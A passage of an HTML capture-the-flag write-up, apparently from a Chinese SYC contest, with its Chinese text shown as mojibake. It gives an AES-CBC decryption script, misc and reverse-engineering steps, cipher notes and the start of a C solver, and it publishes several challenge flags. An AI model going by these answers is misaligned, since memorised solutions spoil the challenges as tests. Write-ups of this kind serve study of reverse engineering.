</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="mi">4</span><span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s0</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>  <span class="o">^</span> <span class="n">gf_mul</span><span class="p">(</span><span class="n">s3</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_block</span><span class="p">(</span><span class="n">block</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">v5</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">inv_sbox</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># start with round 10</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">inv_shift_rows</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">inv_sbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">rnd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">rnd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_mix_columns</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_shift_rows</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="n">inv_sub_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">inv_sbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span> <span class="o">=</span> <span class="n">add_round_key</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">state</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------- v5_data (the 192-byte array from the C program) ----------</span>
</span></span><span class="line"><span class="cl"><span class="n">v5_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x53</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">,</span><span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x6B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x60</span><span class="p">,</span><span class="mh">0x4B</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x0F</span><span class="p">,</span><span class="mh">0x3D</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x3D</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0xE3</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x7A</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0x2A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xB1</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xAB</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xF9</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0x9B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x3C</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x9C</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x7F</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0x8F</span><span class="p">,</span><span class="mh">0x5F</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x62</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0x2E</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mh">0xE5</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0x5B</span><span class="p">,</span><span class="mh">0xE1</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mh">0xF7</span><span class="p">,</span><span class="mh">0x9F</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x2B</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x13</span><span class="p">,</span><span class="mh">0x5C</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0xF3</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0x0A</span><span class="p">,</span><span class="mh">0x0F</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0xFD</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x96</span><span class="p">,</span><span class="mh">0xA5</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xFE</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x1C</span><span class="p">,</span><span class="mh">0xAB</span><span class="p">,</span><span class="mh">0xF1</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7C</span><span class="p">,</span><span class="mh">0x37</span><span class="p">,</span><span class="mh">0xD3</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xB8</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0xDD</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xF6</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0x2D</span><span class="p">,</span><span class="mh">0xA0</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0x1A</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xFF</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x33</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xE4</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xEE</span><span class="p">,</span><span class="mh">0xED</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x92</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x73</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0x7B</span><span class="p">,</span><span class="mh">0x9D</span><span class="p">,</span><span class="mh">0xA8</span><span class="p">,</span><span class="mh">0xAB</span><span class="p">,</span><span class="mh">0xFC</span><span class="p">,</span><span class="mh">0xD9</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0x4B</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xD8</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x9F</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x2B</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0x6B</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0xA4</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xF1</span><span class="p">,</span><span class="mh">0x7C</span><span class="p">,</span><span class="mh">0xDD</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x31</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x32</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------- Example: decrypt user-provided hex ----------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># replace or input cipher_hex as needed</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher_hex</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;è¾“å…¥å¯†æ–‡ hexï¼ˆæ— ç©ºæ ¼ï¼‰ï¼š&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">cipher_hex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># prepare sboxes</span>
</span></span><span class="line"><span class="cl"><span class="n">sbox</span><span class="p">,</span> <span class="n">inv_sbox</span> <span class="o">=</span> <span class="n">build_sboxes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># CBC decrypt</span>
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">v5_data</span><span class="p">[</span><span class="mi">176</span><span class="p">:</span><span class="mi">192</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">),</span> <span class="mi">16</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&#34;å¯†æ–‡é•¿åº¦å¿…é¡»ä¸º 16 çš„å€æ•°&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">plaintext</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">prev</span> <span class="o">=</span> <span class="n">iv</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">blk</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_state</span> <span class="o">=</span> <span class="n">decrypt_block</span><span class="p">(</span><span class="n">blk</span><span class="p">,</span> <span class="n">v5_data</span><span class="p">,</span> <span class="n">inv_sbox</span><span class="p">)</span>  <span class="c1"># list of 16 bytes</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_blk</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">dec_state</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">prev</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">plain_blk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">prev</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">blk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å» PKCS#7 å¡«å……ï¼ˆè‹¥åˆæ³•ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">pad</span> <span class="o">=</span> <span class="n">plaintext</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;=</span> <span class="n">pad</span> <span class="o">&lt;=</span> <span class="mi">16</span> <span class="ow">and</span> <span class="n">plaintext</span><span class="p">[</span><span class="o">-</span><span class="n">pad</span><span class="p">:]</span> <span class="o">==</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">pad</span><span class="p">])</span><span class="o">*</span><span class="n">pad</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">plaintext</span><span class="p">[:</span><span class="o">-</span><span class="n">pad</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†æ˜æ–‡ï¼ˆASCIIï¼‰:&#34;</span><span class="p">,</span> <span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¾“å…¥å¯†æ–‡ hexï¼ˆæ— ç©ºæ ¼ï¼‰ï¼šB2B3DCB9F8D693FFB5A1CC2A6FDE2744AF2198DD00C10D1C5306813E16ABDF13
è§£å¯†æ˜æ–‡ï¼ˆASCIIï¼‰: We_ve_Trapped_in_The_Sink</p>
<p>ç°åœ¨å·²ç»è·å¾—äº†å¯†ç è§£å¯†å‹ç¼©åŒ…å¯å¾—ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶</p>
<p>æ‰“å¼€å¬ä¸€ä¸‹å‘ç°å£°éŸ³ååˆ†åˆºè€³å¤§æ¦‚ç‡æ˜¯SSTV</p>
<p>è½¬æˆå›¾ç‰‡æ˜¯<img src="C:%5cUsers%5casus%5cDesktop%5cgeek%5cweek2%5cmisc%5cSignal-2086-1-1%5cbabe905a-4ae8-40d3-af41-c5189f360145.png"
	
	
	
	loading="lazy"
	
		alt="babe905a-4ae8-40d3-af41-c5189f360145"
	
	
></p>
<p>æ‰«æåæ˜¯ä¸€ä¸ªç½‘ç›˜æ–‡ä»¶ï¼Œä¸‹è½½åæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå¥½åƒæ˜¯ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œæ”¹ä¸€ä¸‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè§£å‹ä¹‹åå°±æ˜¯æ ‡å‡†çš„æ‘©æ–¯ç”µç äº†æœ€åç»“æœSYC{7h15_1S_4_9r4nD_c0N5p1r@cY.}</p>
<h3 id="9qyqsã®å¥‡å¦™å†’é™©2">9.QYQSã®å¥‡å¦™å†’é™©2
</h3><p>ç›´æ¥åç¼–è¯‘ä¹‹åçœ‹dataå°±å¯ä»¥ç›´æ¥æ‰¾åˆ°SYC{M@y_bE_y0u_F1nd?}</p>
<h3 id="10stack_bomb">10.stack_bomb
</h3><p>è¿™é¢˜å¦‚æœåŠ å¯†ä¸ç†Ÿæ‚‰ä½†æœ‰è€å¿ƒçš„è¯ï¼Œå¯ä»¥åŠ¨è°ƒä¸€è¡Œä¸€è¡Œçœ‹æ±‡ç¼–å¹²äº†ä»€ä¹ˆï¼Œæˆ‘å°±æ˜¯è¿™ä¹ˆåšçš„æœ‰ç‚¹è‚ä¸æ¨è</p>
<p>åŠ å¯†è¿‡ç¨‹çš„æ‰‹è®°ï¼š</p>
<p>åå››å°ç«¯åºæ‹¼æ¥æ•´æ•°å·¦ç§»4åŠ 1 =a&mdash;&gt;var_6c</p>
<p>åå››å°ç«¯åºæ‹¼æ¥æ•´æ•°+9*iå000000 =b</p>
<p>a^b=c &mdash;-&gt;var_6c</p>
<p>(var_18å°ç«¯åºæ‹¼æ¥æ•´æ•°å·¦ç§»4åŠ 1)^(var_18å°ç«¯åºæ‹¼æ¥æ•´æ•°+9*iå000000) &mdash;-&gt;var_6c</p>
<p>(var_18æ‹¼æ¥æ•´æ•°å·¦ç§»5ä½å†åŠ 2)^var_6c=e</p>
<p>e+var_cå°ç«¯æ‹¼æ¥æ•´æ•° &mdash;-&gt;var_c</p>
<p>var_cå·¦ç§»4+3&mdash;-&gt;var_6c</p>
<p>(var_c+9*iå000000)^var_6c&mdash;&mdash;-&gt;var_6c</p>
<p>(var_cå³ç§»5(çœç•¥å‰å¯¼é›¶åçš„ç®€åŒ–å†™æ³•)+4 )^var_6c+var_18å°ç«¯æ•´æ•°&mdash;&ndash;&gt;var_18</p>
<p>var_18(ç¬¬ä¸€æ¬¡ä¸ºåå››ä½)</p>
<p>var_c(ç¬¬ä¸€æ¬¡ä¸ºå‰å››ä½)</p>
<p>å»ºè®®å†™ä¸ªä»£ç å¤ç°ä¸€ä¸‹ï¼Œå¯¹äº†åœ¨è§£å¯†ã€‚</p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// è¾…åŠ©å‡½æ•°ï¼š4å­—èŠ‚æ•°ç»„æŒ‰å°ç«¯åºè½¬æ¢ä¸º32ä½æ•´æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint32_t</span> <span class="nf">bytes_to_uint32_le</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>        <span class="o">|</span>
</span></span><span class="line"><span class="cl">           <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span>   <span class="o">|</span>
</span></span><span class="line"><span class="cl">           <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>  <span class="o">|</span>
</span></span><span class="line"><span class="cl">           <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è¾…åŠ©å‡½æ•°ï¼š32ä½æ•´æ•°æŒ‰å°ç«¯åºè½¬æ¢ä¸º4å­—èŠ‚æ•°ç»„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">uint32_to_bytes_le</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">bytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
